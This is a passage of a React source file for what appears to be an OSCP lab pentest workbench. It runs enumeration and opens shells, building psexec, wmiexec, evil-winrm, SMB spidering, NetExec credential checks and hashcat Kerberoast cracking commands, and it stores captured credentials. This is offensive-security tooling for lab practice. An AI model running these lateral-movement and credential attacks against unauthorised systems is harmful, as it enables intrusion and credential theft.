import {
  useEffect, useRef, useState,
  type CSSProperties, type PointerEvent as ReactPointerEvent,
} from "react";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import VpnControl from "./VpnControl";
import InteractiveTerminal from "./InteractiveTerminal";
import ServiceIntelligencePanel, {type ServiceIntelligence} from "./ServiceIntelligencePanel";
import "./service-intelligence.css";
import { statusCopy as statusLabel } from "./ui";
import { getServiceGuidance } from "./serviceGuidance";
import { getCredentialAuditProfile } from "./credentialAudit";
import { summarizeCredentialAudit } from "./credentialAuditResult";
import {
  keepSelectedService,
  missingServiceFacts,
  parseFeroxbusterResults,
  parseSmbFiles,
  parseSmbShares,
  parseScriptObservations,
  rankInvestigationCommands,
  remainingInvestigationCommands,
  summarizeExecutionResult,
} from "./serviceIntel";
type Project = { id: number; name: string; description: string };
type Target = {
  id: number;
  project_id: number;
  name: string;
  ip: string;
  hostname: string;
  os_guess: string;
  vpn: string;
  notes: string;
};
type Service = {
  id: number;
  target_id: number;
  port: number;
  protocol: string;
  state: string;
  name: string;
  product: string;
  version: string;
  extra_info: string;
  scripts: string;
  notes: string;
  tags: string;
  cpe: string;
  tls: boolean;
  detection_evidence: string;
};
type RunState = {
  id?: number;
  templateId: string;
  name: string;
  status: "starting" | "running" | "completed" | "failed" | "stopped" |
    "no_response" | "error";
  startedAt: number;
  exitCode?: number | null;
  message?: string;
  stdout?: string;
  stderr?: string;
};
const api = async <T,>(path: string, init?: RequestInit): Promise<T> => {
  const r = await fetch("/api" + path, init);
  if (!r.ok) throw new Error((await r.json()).detail || r.statusText);
  return r.status === 204 ? (null as T) : r.json();
};
// Wraps a value as a single POSIX shell word for text typed into a live PTY
// (the desktop-terminal PoC/exec handoff never passes through the backend's
// own shlex.quote-based argv rendering, so this is its only injection guard).
const shellQuote = (value: string) => `'${value.replace(/'/g, "'\\''")}'`;
const sourceLabel: Record<string, string> = {
  manual: "직접 입력", "share-file": "공유 파일", web: "웹", config: "설정 파일",
  kerberoast: "Kerberoast", reuse: "재사용", other: "기타",
};
const riskLabel: Record<string, string> = {
  low: "낮음",
  medium: "주의",
  high: "높음",
};
const authContextNotice: Record<string, string> = {
  domain: "DNS는 일반적인 사용자·비밀번호 로그인이 없습니다. 재귀 질의와 NSID 등 노출 상태를 확인하세요.",
  dns: "DNS는 일반적인 사용자·비밀번호 로그인이 없습니다. 재귀 질의와 NSID 등 노출 상태를 확인하세요.",
  nfs: "NFS는 보통 계정보다 호스트·Export·UID/GID로 접근을 제어합니다. 공개 Export를 먼저 확인하세요.",
  rpcbind: "RPC/NFS는 범용 로그인 대신 노출된 RPC 프로그램과 Export 권한을 조사하세요.",
  "kerberos-sec": "Kerberos 인증 점검에는 Realm·도메인과 검토한 사용자 목록이 필요합니다. AD Information에서 문맥을 먼저 기록하세요.",
  wsman: "WinRM 점검에는 도메인과 NTLM/Kerberos 인증 문맥이 필요합니다. 범용 HTTP 비밀번호 점검을 대신 실행하지 않습니다.",
  wsmans: "WinRM 점검에는 도메인과 NTLM/Kerberos 인증 문맥이 필요합니다. 범용 HTTP 비밀번호 점검을 대신 실행하지 않습니다.",
};
export default function App() {
  const qc = useQueryClient();
  const runGenerationRef = useRef(0);
  const activeEventSourceRef = useRef<EventSource | null>(null);
  const workRef = useRef<HTMLElement>(null);
  const credentialAuditRef = useRef<HTMLElement>(null);
  const smbResultsRef = useRef<HTMLElement>(null);
  const servicesResize = useRef({x: 0, width: 235});
  const notesResize = useRef({x: 0, width: 360});
  const notesRef = useRef<HTMLElement>(null);
  const workspaceResize = useRef({y: 0, height: 420});
  const [projectId, setProjectId] = useState<number>();
  const [targetId, setTargetId] = useState<number>();
  const [serviceId, setServiceId] = useState<number>();
  const [output, setOutput] = useState(
    "서비스를 선택하고 검토한 명령을 실행하세요.\n",
  );
  const [executionView, setExecutionView] = useState<"list" | "detail">("list");
  const [selectedExecutionId, setSelectedExecutionId] = useState<number>();
  const [executionDetail, setExecutionDetail] = useState<any>();
  const [smbConnecting, setSmbConnecting] = useState<string>();
  const [lastSpiderShare, setLastSpiderShare] = useState<string>();
  const [netexecDomain, setNetexecDomain] = useState("");
  const [netexecUsername, setNetexecUsername] = useState("");
  const [netexecPassword, setNetexecPassword] = useState("");
  const [netexecHint, setNetexecHint] = useState("");
  const [netexecStoreSecret, setNetexecStoreSecret] = useState(false);
  const [netexecSourceKind, setNetexecSourceKind] = useState("manual");
  const [netexecSourceDetail, setNetexecSourceDetail] = useState("");
  const [netexecSaving, setNetexecSaving] = useState(false);
  const [evidenceMsg, setEvidenceMsg] = useState("");
  const [fuzzWordlist, setFuzzWordlist] = useState("/usr/share/wordlists/dirb/common.txt");
  const [fuzzFilter, setFuzzFilter] = useState("");
  const [psexecSession, setPsexecSession] = useState<
    {id: number; command: string} | undefined
  >();
  const [psexecInputRequest, setPsexecInputRequest] = useState<
    {id: number; data: string} | undefined
  >();
  const [privescServer, setPrivescServer] = useState<
    {running: boolean; port?: number; base_url?: string} | undefined
  >();
  const [privescServerBusy, setPrivescServerBusy] = useState(false);
  const [smbConnectError, setSmbConnectError] = useState("");
  const [servicesWidth, setServicesWidth] = useState(() => {
    const saved = Number(localStorage.getItem("oscp-services-panel-width"));
    return saved >= 180 && saved <= 420 ? saved : 235;
  });
  const [servicesCollapsed, setServicesCollapsed] = useState(
    () => localStorage.getItem("oscp-services-panel-collapsed") === "true",
  );
  const [notesWidth, setNotesWidth] = useState(() => {
    const saved = Number(localStorage.getItem("oscp-execution-panel-width"));
    return saved >= 285 && saved <= 720 ? saved : 360;
  });
  const [notesCollapsed, setNotesCollapsed] = useState(
    () => {
      const saved = localStorage.getItem("oscp-execution-panel-collapsed");
      return saved == null ? window.innerWidth < 1500 : saved === "true";
    },
  );
  const [workspaceHeight, setWorkspaceHeight] = useState(() => {
    const saved = Number(localStorage.getItem("oscp-service-workspace-height"));
    return saved >= 180 && saved <= 720 ? saved : 420;
  });
  const [workspaceCollapsed, setWorkspaceCollapsed] = useState(
    () => localStorage.getItem("oscp-service-workspace-collapsed") === "true",
  );
  const [confirm, setConfirm] = useState<any>();
  const [runWithSudo, setRunWithSudo] = useState(true);
  const [serviceNotes, setServiceNotes] = useState("");
  const [serviceTags, setServiceTags] = useState("");
  const [serviceProduct, setServiceProduct] = useState("");
  const [serviceVersion, setServiceVersion] = useState("");
  const [serviceSaveState, setServiceSaveState] = useState<
    "idle" | "saving" | "saved" | "error"
  >("idle");
  const [runState, setRunState] = useState<RunState>();
  const [lastRunEventAt, setLastRunEventAt] = useState<number>();
  const [runProcessAlive, setRunProcessAlive] = useState<boolean>();
  const [clock, setClock] = useState(Date.now());
  const projects = useQuery({
    queryKey: ["projects"],
    queryFn: () => api<Project[]>("/projects"),
  });
  const targets = useQuery({
    queryKey: ["targets", projectId],
    queryFn: () => api<Target[]>(`/targets?project_id=${projectId}`),
    enabled: !!projectId,
  });
  const services = useQuery({
    queryKey: ["services", targetId],
    queryFn: () => api<Service[]>(`/targets/${targetId}/services`),
    enabled: !!targetId,
  });
  const commands = useQuery({
    queryKey: ["commands", serviceId],
    queryFn: () => api<any[]>(`/services/${serviceId}/commands`),
    enabled: !!serviceId,
  });
  const intelligence = useQuery({
    queryKey: ["serviceIntelligence", serviceId],
    queryFn: () => api<ServiceIntelligence>(`/services/${serviceId}/intelligence`),
    enabled: !!serviceId,
  });
  const targetCommands = useQuery({
    queryKey: ["targetIdentityCommands", targetId],
    queryFn: () => api<any[]>(`/targets/${targetId}/identity-commands`),
    enabled: !!targetId,
  });
  const executions = useQuery({
    queryKey: ["executions", targetId],
    queryFn: () => api<any[]>(`/executions?target_id=${targetId}`),
    enabled: !!targetId,
  });
  const privescServerStatus = useQuery({
    queryKey: ["privescServerStatus"],
    queryFn: () => api<any>("/privesc-server/status"),
  });
  useEffect(() => {
    if (privescServerStatus.data) setPrivescServer(privescServerStatus.data);
  }, [privescServerStatus.data]);
  const savedCredentials = useQuery({
    queryKey: ["credentials", projectId],
    queryFn: () => api<any[]>(`/runbooks/credentials?project_id=${projectId}`),
    enabled: !!projectId,
  });
  const status = useQuery({
    queryKey: ["status"],
    queryFn: () => api<any>("/system/status"),
    refetchInterval: 3000,
  });
  useEffect(() => {
    if (!projectId && projects.data?.length) {
      const saved = Number(localStorage.getItem("oscp-workspace-project"));
      setProjectId(projects.data.find((item) => item.id === saved)?.id ||
        projects.data[0].id);
    }
  }, [projects.data]);
  useEffect(() => {
    setTargetId(targets.data?.[0]?.id);
  }, [projectId, targets.data]);
  useEffect(() => {
    setServiceId((current) => keepSelectedService(current, services.data));
  }, [targetId, services.data]);
  useEffect(() => {
    setExecutionView("list");
    setSelectedExecutionId(undefined);
    setExecutionDetail(undefined);
    setSmbConnecting(undefined);
    setSmbConnectError("");
  }, [serviceId]);
  useEffect(() => {
    const selected = services.data?.find((x) => x.id === serviceId) as any;
    setServiceSaveState("idle");
    setServiceNotes(selected?.notes || "");
    setServiceProduct(selected?.product || "");
    setServiceVersion(selected?.version || "");
    try {
      setServiceTags(JSON.parse(selected?.tags || "[]").join(", "));
    } catch {
      setServiceTags("");
    }
  }, [serviceId, services.data]);
  useEffect(() => {
    if (!runState || !["starting", "running"].includes(runState.status)) return;
    const timer = window.setInterval(() => setClock(Date.now()), 1000);
    return () => window.clearInterval(timer);
  }, [runState?.status]);
  const project = projects.data?.find((x) => x.id === projectId),
    target = targets.data?.find((x) => x.id === targetId),
    service = services.data?.find((x) => x.id === serviceId);
  const serviceCpes = (() => {
    try {
      const parsed = JSON.parse(service?.cpe || "[]");
      return Array.isArray(parsed) ? parsed.filter(Boolean) : [];
    } catch {
      return [];
    }
  })();
  const guidance = service && target
    ? getServiceGuidance(service.name, target.ip, service.port)
    : null;
  const serviceExecutions =
    executions.data?.filter((item) => item.service_id === serviceId) || [];
  const selectedExecution = serviceExecutions.find(
    (item) => item.id === selectedExecutionId,
  );
  const observations = service
    ? parseScriptObservations(service.scripts)
    : [];
  const missingFacts = service ? missingServiceFacts(service) : [];
  const missingCount =
    missingFacts.length + (target?.hostname ? 0 : 1) + (target?.os_guess ? 0 : 1);
  const completedChecks = serviceExecutions.filter(
    (item) => item.status === "completed",
  ).length;
  const authenticationCommands = (commands.data || []).filter((item) =>
    /(?:anon|null-session|empty-password|unauthenticated|auth-methods|default-audit|community-audit)/i
      .test(item.id),
  );
  const completedTemplateIds = new Set(
    (executions.data || [])
      .filter((item) => item.status === "completed")
      .map((item) => item.template_id),
  );
  const investigationCommands = remainingInvestigationCommands(
    commands.data || [],
    {
      hostname: target?.hostname || "",
      osGuess: target?.os_guess || "",
      product: service?.product || "",
      version: service?.version || "",
      completedTemplateIds,
    },
  );
  const credentialProfile = getCredentialAuditProfile(service?.name);
  const reviewCommand = (command: any) => {
    setRunWithSudo(Boolean(command.sudo));
    setConfirm(command);
  };
  const openSuccessfulFtpTerminal = async (
    templateId: string,
    stdout: string,
    stderr: string,
  ) => {
    if (templateId !== "ftp-anon" || !targetId || !serviceId) return;
    const summary = summarizeCredentialAudit(templateId, stdout, stderr);
    if (summary.status !== "exposed" || !summary.credential) return;
    const session = await api<any>("/interactive-sessions", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        target_id: targetId,
        service_id: serviceId,
        template_id: "ftp-client",
        variables: {},
        run_as_root: false,
      }),
    });
    await api<any>(
      `/interactive-sessions/${session.id}/desktop?ftp_anonymous=true`,
      {method: "POST"},
    );
    setOutput((value) =>
      `${value}\n[Kali QTerminal에서 anonymous FTP 로그인 세션을 열었습니다.]\n`
    );
  };
  const autoCheckState = (templateIds: string[], resolved = false) => {
    if (!runState || !templateIds.includes(runState.templateId)) return null;
    if (["starting", "running"].includes(runState.status)) {
      return {
        busy: true,
        content: (
          <>
            <span className="buttonSpinner" aria-hidden="true" />
            {runElapsed}s · 확인 중
          </>
        ),
      };
    }
    if (runState.status === "completed")
      return {
        busy: false,
        content: resolved ? <>값 확인 완료</> : <>값 미확인 · 다른 명령 시도</>,
      };
    if (runState.status === "no_response")
      return { busy: false, content: <>결과 없음 · 재시도</> };
    if (["failed", "error", "stopped"].includes(runState.status))
      return { busy: false, content: <>실패 · 재시도</> };
    return null;
  };
  const createProject = useMutation({
    mutationFn: () =>
      api<Project>("/projects", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: `OSCP Practice ${Date.now().toString().slice(-4)}`,
          description: "Local lab workspace",
        }),
      }),
    onSuccess: () => qc.invalidateQueries({ queryKey: ["projects"] }),
  });
  const createTarget = useMutation({
    mutationFn: () =>
      api<Target>("/targets", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          project_id: projectId,
          name: "새 대상",
          ip: prompt("대상 IP", "10.10.10.10") || "",
          hostname: "",
          os_guess: "",
          vpn: "tun0",
          notes: "",
        }),
      }),
    onSuccess: () => qc.invalidateQueries({ queryKey: ["targets"] }),
  });
  const run = async (explicitCommand?: any) => {
    const c = explicitCommand ?? confirm;
    if (!c || !targetId) return;
    setConfirm(null);
    if (c.execution_mode === "interactive") {
      try {
        const variables: any = {};
        if (c.command.includes("{username}")) {
          const username = prompt(
            "사용자 이름(인증 과정은 대화형으로 진행됩니다)",
            "",
          );
          if (!username) return;
          variables.username = username;
        }
        const session = await api<any>("/interactive-sessions", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            target_id: targetId,
            service_id: c.target_level ? null : serviceId,
            template_id: c.id,
            variables,
            run_as_root: runWithSudo,
          }),
        });
        await api<any>(`/interactive-sessions/${session.id}/desktop`, {
          method: "POST",
        });
        setOutput(
          `$ ${session.command}\n\n[Kali 데스크톱 터미널에서 실행했습니다.]\n`,
        );
      } catch (reason) {
        const message = reason instanceof Error ? reason.message : String(reason);
        setOutput(`[데스크톱 터미널 실행 실패] ${message}\n`);
      }
      return;
    }
    setClock(Date.now());
    setLastRunEventAt(Date.now());
    setRunProcessAlive(undefined);
    setRunState({
      templateId: c.id,
      name: c.name,
      status: "starting",
      startedAt: Date.now(),
    });
    setOutput(`$ ${c.preview}\n\n[실행 요청 중]\n`);
    let e: any;
    try {
      e = await api<any>("/executions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          target_id: targetId,
          service_id: c.target_level ? null : serviceId,
          template_id: c.id,
          variables: c.variables || {},
          run_as_root: runWithSudo,
        }),
      });
    } catch (reason) {
      const message = reason instanceof Error ? reason.message : String(reason);
      setRunState((state) => state && {
        ...state, status: "error", message,
      });
      setOutput((value) => `${value}\n[실행 요청 실패] ${message}\n`);
      return;
    }
    setRunState((state) => state && {
      ...state, id: e.id, status: "running",
    });
    setOutput(`$ ${c.preview}\n\n[실행 중 · 작업 #${e.id}]\n`);
    activeEventSourceRef.current?.close();
    const myGeneration = ++runGenerationRef.current;
    const s = new EventSource(`/api/executions/${e.id}/events`);
    activeEventSourceRef.current = s;
    s.onmessage = async (ev) => {
      if (runGenerationRef.current !== myGeneration) { s.close(); return; }
      const d = JSON.parse(ev.data);
      setLastRunEventAt(Date.now());
      if (d.stream === "heartbeat")
        setRunProcessAlive(Boolean(d.process_alive));
      if (d.stream === "status") {
        let result = {
          status: d.status,
          exit_code: d.exit_code,
          error: d.error,
          stdout: "",
          stderr: "",
        };
        try {
          result = await api<any>(`/executions/${e.id}/output`);
        } catch {
          // The live terminal still contains streamed output if saved output lookup fails.
        }
        if (runGenerationRef.current !== myGeneration) { s.close(); return; }
        setRunState((state) => state && {
          ...state,
          status: result.status,
          exitCode: result.exit_code,
          message: result.error,
          stdout: result.stdout,
          stderr: result.stderr,
        });
        setSelectedExecutionId(e.id);
        setExecutionDetail(result);
        setExecutionView("detail");
        try {
          await openSuccessfulFtpTerminal(
            c.id,
            result.stdout || "",
            result.stderr || "",
          );
        } catch (reason) {
          const message = reason instanceof Error ? reason.message : String(reason);
          setOutput((value) =>
            `${value}\n[성공한 FTP 터미널을 열지 못했습니다] ${message}\n`
          );
        }
        setOutput(
          (x) =>
            x +
            `\n[${statusLabel[d.status] || d.status}${d.exit_code == null ? "" : ` · 종료 코드 ${d.exit_code}`}]`,
        );
        s.close();
        await Promise.all([
          qc.invalidateQueries({ queryKey: ["executions", targetId] }),
          qc.invalidateQueries({ queryKey: ["services", targetId] }),
          qc.invalidateQueries({ queryKey: ["targets", projectId] }),
          qc.invalidateQueries({ queryKey: ["serviceIntelligence"] }),
        ]);
      } else if (d.stream === "stdout" || d.stream === "stderr") {
        setOutput((x) => x + d.data);
      }
    };
    s.onerror = () => {
      setRunState((state) =>
        state && ["starting", "running"].includes(state.status)
          ? {...state, status: "error", message: "실시간 연결이 끊겼습니다."}
          : state,
      );
      s.close();
    };
  };
  const saveService = async () => {
    if (!serviceId) return;
    setServiceSaveState("saving");
    try {
      await api(`/services/${serviceId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          product: serviceProduct,
          version: serviceVersion,
          notes: serviceNotes,
          tags: serviceTags
            .split(",")
            .map((x) => x.trim())
            .filter(Boolean),
        }),
      });
      await qc.invalidateQueries({ queryKey: ["services", targetId] });
      setServiceSaveState("saved");
    } catch {
      setServiceSaveState("error");
    }
  };
  const openExecution = async (id: number) => {
    const data = await api<any>(`/executions/${id}/output`);
    // A still-streaming live run must not overwrite this history view when its
    // own completion event arrives later; retire its generation so it no-ops.
    runGenerationRef.current++;
    setSelectedExecutionId(id);
    setExecutionDetail(data);
    setExecutionView("detail");
    setOutput(
      data.stdout +
        data.stderr +
        `\n[${data.status}${data.exit_code == null ? "" : ` · exit ${data.exit_code}`}]`,
    );
  };
  const stopSavedExecution = async () => {
    if (!selectedExecutionId) return;
    await api(`/executions/${selectedExecutionId}/stop`, { method: "POST" });
    await qc.invalidateQueries({ queryKey: ["executions", targetId] });
    setExecutionDetail((current: any) => current && {
      ...current, status: "stopped",
    });
  };
  const stopCurrentExecution = async () => {
    if (!runState?.id) return;
    await api(`/executions/${runState.id}/stop`, { method: "POST" });
    setRunState((current) => current && { ...current, status: "stopped" });
    await qc.invalidateQueries({ queryKey: ["executions", targetId] });
  };
  const connectSmbShare = async (share: string) => {
    if (!targetId || !serviceId) return;
    setSmbConnectError("");
    setSmbConnecting(share);
    try {
      const session = await api<any>("/interactive-sessions", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          target_id: targetId,
          service_id: serviceId,
          template_id: "smb-share-client",
          variables: {share},
          run_as_root: false,
        }),
      });
      // Every other interactive session (SSH/FTP/Telnet) opens in a real Kali
      // desktop terminal; the embedded xterm.js panel used here previously
      // was a one-off that didn't match, and its blank rendering was reported
      // as a bug against the desktop pattern users already expect.
      await api<any>(`/interactive-sessions/${session.id}/desktop`, {
        method: "POST",
      });
      setOutput((value) =>
        `${value}\n[Kali 데스크톱 터미널에서 ${share} 공유에 접속했습니다.]\n`
      );
    } catch (reason) {
      setSmbConnectError(
        reason instanceof Error ? reason.message : "SMB 공유 세션을 만들지 못했습니다.",
      );
    } finally {
      setSmbConnecting(undefined);
    }
  };
  const spiderSmbShare = (share: string) => {
    if (!target || !service) return;
    // run_as_root reads component state, not the command object, so a stale
    // sudo choice from a previously reviewed command would otherwise leak in.
    setRunWithSudo(false);
    setLastSpiderShare(share);
    void run({
      id: "smb-share-spider",
      preview:
        `smbclient -N //${target.ip}/${share} -p ${service.port} -c 'recurse ON;ls'`,
      target_level: false,
      variables: {share},
    });
  };
  const checkNetexecCredential = () => {
    if (!target || !service || !netexecUsername.trim() || !netexecProtocol) return;
    setRunWithSudo(false);
    void run({
      id: netexecCredCommandId,
      preview: `nxc ${netexecProtocol} ${target.ip} --port ${service.port}` +
        ` -u ${netexecUsername} -p ***`,
      target_level: false,
      variables: {username: netexecUsername, password: netexecPassword},
    });
  };
  const openManualShell = async (command: string) => {
    if (!targetId || !serviceId) return;
    const session = await api<any>("/interactive-sessions/manual", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({target_id: targetId, service_id: serviceId}),
    });
    setPsexecSession({id: session.id, command});
  };
  const openPsexecShell = async () => {
    if (!target) return;
    const identity = [netexecDomain, netexecUsername].filter(Boolean).join("/")
      + (netexecPassword ? `:${netexecPassword}` : "") + "@" + target.ip;
    await openManualShell(`impacket-psexec ${shellQuote(identity)}`);
  };
  const openLateralShell = async (tool: "wmiexec" | "smbexec" | "atexec") => {
    if (!target) return;
    const identity = [netexecDomain, netexecUsername].filter(Boolean).join("/")
      + (netexecPassword ? `:${netexecPassword}` : "") + "@" + target.ip;
    await openManualShell(`impacket-${tool} ${shellQuote(identity)}`);
  };
  const openSshShell = async () => {
    if (!target || !service || !netexecUsername.trim()) return;
    await openManualShell(
      `ssh ${shellQuote(`${netexecUsername}@${target.ip}`)} -p ${service.port}`,
    );
  };
  const openEvilWinrmShell = async () => {
    if (!target || !netexecUsername.trim()) return;
    await openManualShell(
      `evil-winrm -i ${target.ip} -u ${shellQuote(netexecUsername)}` +
      ` -p ${shellQuote(netexecPassword)}`,
    );
  };
  const copyXfreerdpCommand = async () => {
    if (!target || !netexecUsername.trim()) return;
    await navigator.clipboard.writeText(
      `xfreerdp /v:${target.ip} /u:${shellQuote(netexecUsername)}` +
      ` /p:${shellQuote(netexecPassword)} /cert:ignore`,
    );
    setOutput((value) => `${value}\n[xfreerdp 명령을 클립보드로 복사했습니다 — RDP는 GUI라 별도 터미널에서 붙여넣어 실행하세요]\n`);
  };
  const openMssqlShell = async () => {
    if (!target || !service || !netexecUsername.trim()) return;
    const auth = netexecDomain
      ? `${netexecDomain}/${netexecUsername}:${netexecPassword}@${target.ip}`
      : `${netexecUsername}:${netexecPassword}@${target.ip}`;
    await openManualShell(
      `impacket-mssqlclient ${shellQuote(auth)} -port ${service.port}`,
    );
  };
  const openHashcatShell = async () => {
    if (!target) return;
    // Kerberoast TGS-REP hashes are hashcat mode 13100. The manual shell opens
    // in the target dir; the roast file lives under outputs/. User points
    // hashcat at their own wordlist, then registers the cracked password below.
    await openManualShell(
      "hashcat -m 13100 outputs/kerberoast-hashes.txt /usr/share/wordlists/rockyou.txt",
    );
  };
  const viewSmbFile = (path: string) => {
    if (!target || !service || !lastSpiderShare) return;
    setRunWithSudo(false);
    void run({
      id: "smb-share-file-view",
      preview: `smbget -a -q --stdout smb://${target.ip}/${lastSpiderShare}/${path}`,
      target_level: false,
      variables: {share: lastSpiderShare, path},
    });
  };
  // Capture a completed execution's output as command_output evidence so the
  // report chain (what was run, against what, with what result) is preserved
  // and hash-tracked. NetExec/credential output is treated as sensitive.
  const captureEvidence = async (
    execution: {id: number; command?: string; stdout?: string; stderr?: string},
    title: string, sensitivity: "normal" | "sensitive" = "normal",
  ): Promise<number | undefined> => {
    if (!projectId || !targetId) return undefined;
    setEvidenceMsg("");
    try {
      const body = `$ ${execution.command || ""}\n\n${execution.stdout || ""}` +
        `${execution.stderr ? `\n[stderr]\n${execution.stderr}` : ""}`;
      const data = new FormData();
      data.append("project_id", String(projectId));
      data.append("target_id", String(targetId));
      if (serviceId) data.append("service_id", String(serviceId));
      data.append("title", title);
      data.append("description", `자동 캡처 · ${new Date().toLocaleString()}`);
      data.append("kind", "command_output");
      data.append("source_type", "command_output");
      data.append("source_id", String(execution.id));
      data.append("sensitivity", sensitivity);
      data.append("file", new File([body], `execution-${execution.id}.txt`,
        {type: "text/plain"}));
      const response = await fetch("/api/evidence/upload", {method: "POST", body: data});
      const created = await response.json();
      if (!response.ok) throw new Error(created.detail || response.statusText);
      await qc.invalidateQueries({queryKey: ["evidence", projectId]});
      setEvidenceMsg(`Evidence로 저장됨: ${title}`);
      return created.id as number;
    } catch (reason) {
      setEvidenceMsg(`Evidence 저장 실패: ${reason instanceof Error ? reason.message : reason}`);
      return undefined;
    }
  };
  // Promote an attack result to a Draft finding pre-linked to its evidence. The
  // app never sets severity/impact/conclusions — those stay Informational/Draft
  // for the user to author, matching the observation->finding boundary.
  const promoteToFinding = async (
    execution: {id: number; stdout?: string; stderr?: string},
    title: string, reproduction: string, sensitivity: "normal" | "sensitive",
  ) => {
    const evidenceId = await captureEvidence(execution, title, sensitivity);
    if (!evidenceId || !projectId) return;
    try {
      await api("/findings", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          project_id: projectId, target_id: targetId, service_id: serviceId,
          title, status: "Draft", reproduction_steps: reproduction,
          evidence: [{evidence_id: evidenceId, is_primary: true}],
        }),
      });
      await qc.invalidateQueries({queryKey: ["findings", projectId]});
      setEvidenceMsg(`Finding(Draft)으로 승격됨 · Reports에서 내용을 작성하세요: ${title}`);
    } catch (reason) {
      setEvidenceMsg(`Finding 승격 실패: ${reason instanceof Error ? reason.message : reason}`);
    }
  };
  const runDirectoryFuzz = () => {
    if (!target || !service || !fuzzWordlist.trim()) return;
    setRunWithSudo(false);
    const scheme = service.name.toLowerCase().includes("ssl") ? "https" : "http";
    void run({
      id: "http-directory-fuzz",
      preview: `feroxbuster -u ${scheme}://${target.ip}:${service.port}/` +
        ` -w ${fuzzWordlist} --json --silent -n`,
      target_level: false,
      variables: {wordlist: fuzzWordlist},
    });
  };
  const togglePrivescServer = async () => {
    setPrivescServerBusy(true);
    try {
      const result = await api<any>(
        `/privesc-server/${privescServer?.running ? "stop" : "start"}`,
        {method: "POST"},
      );
      setPrivescServer(result);
    } finally {
      setPrivescServerBusy(false);
    }
  };
  const sendPrivescCommand = async (command: string) => {
    if (psexecSession) {
      setPsexecInputRequest({id: Date.now(), data: command});
      return;
    }
    await navigator.clipboard.writeText(command);
    setOutput((value) =>
      `${value}\n[psexec 셸이 열려있지 않아 클립보드로 복사했습니다]\n$ ${command}\n`
    );
  };
  const applySavedCredential = (credential: any) => {
    setNetexecDomain(credential.domain || "");
    setNetexecUsername(credential.username || "");
    // A stored secret auto-fills the live password so command generation and
    // re-validation work without re-typing; otherwise clear and re-enter.
    setNetexecPassword(credential.secret || "");
    setNetexecHint(credential.secret_hint || "");
    setNetexecSourceKind(credential.source_kind || "manual");
    setNetexecSourceDetail(credential.source_detail || "");
  };
  const saveNetexecCredential = async () => {
    if (!projectId || !netexecUsername.trim()) return;
    setNetexecSaving(true);
    try {
      await api("/runbooks/credentials", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          project_id: projectId, target_id: targetId, service_id: serviceId,
          username: netexecUsername, domain: netexecDomain,
          secret_hint: netexecHint,
          secret: netexecStoreSecret ? netexecPassword : "",
          source_kind: netexecSourceKind, source_detail: netexecSourceDetail,
          service_names: service ? [service.name] : [],
        }),
      });
      await qc.invalidateQueries({queryKey: ["credentials", projectId]});
    } finally {
      setNetexecSaving(false);
    }
  };
  const deleteSavedCredential = async (id: number) => {
    await api(`/runbooks/credentials/${id}`, {method: "DELETE"});
    await qc.invalidateQueries({queryKey: ["credentials", projectId]});
  };
  const beginNotesResize = (event: ReactPointerEvent<HTMLDivElement>) => {
    notesResize.current = {x: event.clientX, width: notesWidth};
    event.currentTarget.setPointerCapture(event.pointerId);
  };
  const applyServicesWidth = (width: number) => {
    const next = Math.min(420, Math.max(180, width));
    setServicesWidth(next);
    setServicesCollapsed(false);
    localStorage.setItem("oscp-services-panel-width", String(next));
    localStorage.setItem("oscp-services-panel-collapsed", "false");
  };
  const beginServicesResize = (event: ReactPointerEvent<HTMLDivElement>) => {
    servicesResize.current = {x: event.clientX, width: servicesWidth};
    event.currentTarget.setPointerCapture(event.pointerId);
  };
  const resizeServices = (event: ReactPointerEvent<HTMLDivElement>) => {
    if (!event.currentTarget.hasPointerCapture(event.pointerId)) return;
    applyServicesWidth(
      servicesResize.current.width + event.clientX - servicesResize.current.x,
    );
  };
  const finishServicesResize = (event: ReactPointerEvent<HTMLDivElement>) => {
    if (event.currentTarget.hasPointerCapture(event.pointerId))
      event.currentTarget.releasePointerCapture(event.pointerId);
  };
  const applyNotesWidth = (width: number) => {
    const next = Math.min(720, Math.max(285, width));
    setNotesWidth(next);
    setNotesCollapsed(false);
    localStorage.setItem("oscp-execution-panel-width", String(next));
    localStorage.setItem("oscp-execution-panel-collapsed", "false");
  };
  const resizeNotes = (event: ReactPointerEvent<HTMLDivElement>) => {
    if (!event.currentTarget.hasPointerCapture(event.pointerId)) return;
    applyNotesWidth(Math.min(720, Math.max(
      285, notesResize.current.width + notesResize.current.x - event.clientX,
    )));
  };
  const finishNotesResize = (event: ReactPointerEvent<HTMLDivElement>) => {
    if (event.currentTarget.hasPointerCapture(event.pointerId))
      event.currentTarget.releasePointerCapture(event.pointerId);
  };
  const workspaceHeightLimit = () => Math.max(
    180,
    Math.min(720, (notesRef.current?.clientHeight || 900) - 150),
  );
  const applyWorkspaceHeight = (height: number) => {
    const next = Math.min(workspaceHeightLimit(), Math.max(180, height));
    setWorkspaceHeight(next);
    setWorkspaceCollapsed(false);
    localStorage.setItem("oscp-service-workspace-height", String(next));
    localStorage.setItem("oscp-service-workspace-collapsed", "false");
  };
  const beginWorkspaceResize = (event: ReactPointerEvent<HTMLDivElement>) => {
    workspaceResize.current = {y: event.clientY, height: workspaceHeight};
    event.currentTarget.setPointerCapture(event.pointerId);
  };
  const resizeWorkspace = (event: ReactPointerEvent<HTMLDivElement>) => {
    if (!event.currentTarget.hasPointerCapture(event.pointerId)) return;
    applyWorkspaceHeight(
      workspaceResize.current.height + workspaceResize.current.y - event.clientY,
    );
  };
  const finishWorkspaceResize = (event: ReactPointerEvent<HTMLDivElement>) => {
    if (event.currentTarget.hasPointerCapture(event.pointerId))
      event.currentTarget.releasePointerCapture(event.pointerId);
  };
  const upload = async (f: File) => {
    if (!targetId) return;
    const d = new FormData();
    d.append("file", f);
    await api(`/targets/${targetId}/nmap`, { method: "POST", body: d });
